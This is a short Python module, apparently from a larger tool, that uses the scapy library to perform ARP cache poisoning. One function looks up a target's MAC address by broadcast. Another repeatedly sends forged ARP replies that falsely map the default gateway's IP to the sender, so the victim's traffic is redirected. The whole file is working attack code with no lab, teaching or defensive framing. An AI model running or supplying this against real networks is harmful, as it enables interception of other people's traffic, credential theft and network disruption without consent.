import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import subnet_info

def get_mac(ip):
    target_mac_request = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip)
    target_mac_response = srp1(target_mac_request, verbose=False)
    return target_mac_response[ARP].hwsrc

def poison(target_ip,power=10):
    target_mac = get_mac(target_ip)
    default_gateway = subnet_info.get_default_gateway()
    p = Ether(dst=target_mac)/ARP(hwdst=target_mac,pdst=target_ip,psrc=default_gateway,op='is-at')
    for i in range(power):
        sendp(p,verbose=False)

